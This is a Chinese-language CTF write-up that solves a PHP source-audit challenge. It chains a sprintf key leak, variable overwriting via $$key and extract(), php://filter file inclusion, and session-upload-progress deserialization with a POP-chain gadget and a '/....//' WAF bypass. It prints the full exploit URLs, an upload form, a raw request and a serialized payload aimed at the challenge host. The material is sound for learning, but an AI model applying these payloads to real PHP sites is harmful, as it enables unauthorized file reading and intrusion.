## ictf_best_language1_writeup
**第一步、代码审计**

 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这次i春秋举办的ictf是一场以练习为主的ctf竞赛，很多题目还是很不错的，其中这一道源码审计的题目我认为很有意思，涵盖了变量覆盖，反序列化，本地文件包含，以及session.upload_progress.enabled的知识点，是一道很有意思的题目，以下是详细解题过程：
```
<?php
    error_reporting(0);  
    highlight_file(__FILE__);
    include('secret_key.php');
    if(!empty($_GET["name"])) {
    $arr = array($_GET["name"],$secret_key);
    $data = "Welcome my friend %s";
    foreach ($arr as $k => $v) {
        $data = sprintf($data,$v);                       //格式化字符串漏洞的（我也不知道是不是叫这个），输入的name为%s就能读取到秘钥  th3_k3y_y0u_cann0t_guess2333           
    }
    echo $data;
    }


    if( ($secret_key) === $_GET['key']){
        echo "you get the key";
        $first='aa';
        $ccc='amdin';
        $i=1;
        foreach($_GET as $key => $value) {
                if($i===1)
                {
                    $i++;
                    $$key = $value;                                   //变量覆盖，但是只能覆盖一个，所以我们把first放GET参数第一个，赋值为 u
                }
                else{break;}
        }
        if($first==="u")
        {
            echo "shi fu 666";
            $file='phpinfo.php';
            $func = $_GET['function'];
            call_user_func($func,$_GET);                             //来个变量覆盖函数 extract   然后把ccc赋值为F1ag  注意：由于后面有include,所以我们还可以改$file参数，可以利用LFI读取到class.php的源码
                                                                       还有call_user_func函数，第一个是函数名，第二个是传入的参数，但是只能传一个参数，传多个参数使用call_user_func_array
            if($ccc==="F1ag")
            {
                echo "tqltqltqltqltql";
                require('class.php');
                include($file);
            }




        }
        else
        {
            echo "Can you hack me?";
        }
    }
```
这一段代码中需要利用的几个知识点：

1. `$data = sprintf($data,$v); `这一句是有格式化字符串漏洞的（我也不知道是不是叫这个），输入的name为%s就能读取到秘钥  th3_k3y_y0u_cann0t_guess2333
2. `$$key = $value; ` 存在变量覆盖漏洞，但是根据上下文只能覆盖一个变量，所以我们把first放GET参数第一个，赋值为 u
3. `call_user_func($func,$_GET);`这个地方可以调用函数，由于需要满足后面的`if($ccc==="F1ag")`，所以我们调用具有变量覆盖漏洞的函数`extract()`，然后将ccc赋值为F1ag， 其中call_user_func函数，第一个是函数名，第二个是传入的参数，但是只能传一个参数，传多个参数使用call_user_func_array **注意：由于后面有include,所以我们还可以改$file参数，可以利用LFI读取到class.php的源码**
4. 这里都有LFI了，应该可以getshell才对，通过包含：/proc/self/environ 或者日志文件。。。但是都没有权限，甚至/etc/passwd也读不到

由于有`require('class.php');`的一句，所以我们直接通过php伪协议读取class.php的源码，payload如下:
```
http://120.55.43.255:13006/?first=u&name=%s&key=th3_k3y_y0u_cann0t_guess2333&function=extract&ccc=F1ag&file=php://filter/read=convert.base64-encode/resource=class.php
```
源码如下:
```
<?php
ini_set('session.serialize_handler', 'php');
session_start();
class Monitor {
    public $test;
    function __construct() {
        $this->test ="index.php";
    }


    function __destruct() {
    echo "
file:" .$this->test."
";
}
}


class Welcome {
    public $obj;
    public $var;
    function __construct(){
        $this->var='success';
        $this->obj=null;
    }
    function __toString(){
        $this->obj->execute();
        return $this->var."";
    }



}
class Come{
    public $method;
    public $args;
    function __construct($method, $args) {
        $this->method = $method;
        $this->args = $args;
    }
    function __wakeup(){
        foreach($this->args as $k => $v) {
            $this->args[$k] = $this->waf(trim($v));
        }
    }
    function waf($str){
        $str=preg_replace("/[<>*;|?\n ]/","",$str);
        $str=str_replace('/../','',$str);
        $str=str_replace('../','',$str);
        return $str;
    }
    function get_dir($path){
        print_r(scandir("/tmp".$path));
    }


    function execute() {
        if (in_array($this->method, array("get_dir"))) {
            call_user_func_array(array($this, $this->method), ($this->args));                                    //call_user_func_array函数第一个参数也是传函数名，而这个传数组就是array($this, $this->method)表示$this::method，第二个参数以数组的形式传入多个参数
        }
    }
}
?>
```
知识点：`ini_set('session.serialize_handler', 'php');`，这个显然与session设置有关，由phpinfo()页面知，`session.upload_progress.enabled`为On。当一个上传在处理中，同时POST一个与INI中设置的`session.upload_progress.name`同名变量时，当PHP检测到这种POST请求时，它会在`$_SESSION`中添加一组数据。所以可以通过`Session Upload Progress`来设置session。

因此我们构造表单
```
<html>
<head>
    <title>upload</title>
</head>
<body>
    <form action="http://120.55.43.255:13006/" method="POST" enctype="multipart/form-data">
        <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="1" />
        <input type="file" name="file" />
        <input type="submit" />
    </form>
</body>
</html>
```
**注意，这个弄出来的HTTP头少了一个Accept-Encoding，需要加上头部字段：Accept-Encoding: gzip, deflate**

然后得到http请求头为：
```
POST /class.php HTTP/1.1
Host: 120.55.43.255:13006
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------57052814523281
Content-Length: 714
Connection: close
Cookie: PHPSESSID=6o6k31opf8h9cmeb60mu2gaac1
Upgrade-Insecure-Requests: 1

-----------------------------57052814523281
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

123
-----------------------------57052814523281
Content-Disposition: form-data; name="file"; filename="123"     //这个filename就是我们要反序列化的地方
Content-Type: text/plain

wewetert

-----------------------------57052814523281--
```
其中第二个filename变量就是我们要填写序列化字符串的地方
这个序列化如何构造呢？
```
<?php
ini_set('session.serialize_handler', 'php');
session_start();
class Monitor {
    public $test;
    function __construct() {
        $this->test =new Welcome();
    }


    function __destruct() {
    echo "
file:" .$this->test."
";
}
}


class Welcome {
    public $obj;
    public $var;
    function __construct(){
        $this->var='{$_GET}';
        $this->obj=new Come('get_dir',array('/....//var/www/html'));
    }
    function __toString(){
        $this->obj->execute();
        return $this->var."";
    }



}
class Come{
    public $method;
    public $args;
    function __construct($method, $args) {
        $this->method = $method;
        $this->args = $args;
    }
    function __wakeup(){
        foreach($this->args as $k => $v) {
            $this->args[$k] = $this->waf(trim($v));
        }
    }
    function waf($str){
        $str=preg_replace("/[<>*;|?\n ]/","",$str);
        $str=str_replace('/../','',$str);
        $str=str_replace('../','',$str);
        return $str;
    }
    function get_dir($path){
        print_r(scandir("/tmp".$path));
    }


    function execute() {
        if (in_array($this->method, array("get_dir"))) {
            call_user_func_array(array($this, $this->method), ($this->args));
        }
    }
}




$c = new Monitor();
$d= str_replace('"', '\\"', serialize($c));
var_dump($d);
?>
```
注意两个地方：
1. `$this->test =new Welcome();`，这个反序列化的利用逻辑就是通过`Monitor`类的`__destruct`方法调用到`Welcome`类的`__toString`方法，再调用到`Come`类的`execute`方法，达到执行函数的目的，其中，`execute`方法中，由于是`$this->method`，所以只能调用类的方法，不能随便调用系统函数，也就是`get_dir`方法。
2. `$this->obj=new Come('get_dir',array('/....//var/www/html'));`这里主要两点，首先是路径必须以数组的形式传，因为`call_user_func_array`函数要求传入数组作为参数，其次是绕过waf，这个waf太好绕过了，因为这种利用两个`str_replace()`的waf，通常可以利用后一个来绕过前一个，所以/....//就会变成/../就可以跳到上一目录了

从而得到payload:
```
"O:7:\"Monitor\":1:{s:4:\"test\";O:7:\"Welcome\":2:{s:3:\"obj\";O:4:\"Come\":2:{s:6:\"method\";s:7:\"get_dir\";s:4:\"args\";a:1:{i:0;s:19:\"/....//var/www/html\";}}s:3:\"var\";s:7:\"{$_GET}\";}}"
```
也是要注意，里面的双引号前面记得加上\作为转义符，并且最前面的O之前需要加一个 | ,这都是php_session反序列化的格式

最后说一点，这题目权限给的很低，我当时读取根目录都无法读取，整个系统似乎就/tmp与/var/www/html有读权限，这其实挺坑的。。害得我一度怀疑人生。

有一说一，这个题拿来练习做好不过了，准备等学弟学反序列化了，考考他们(我真过分)。
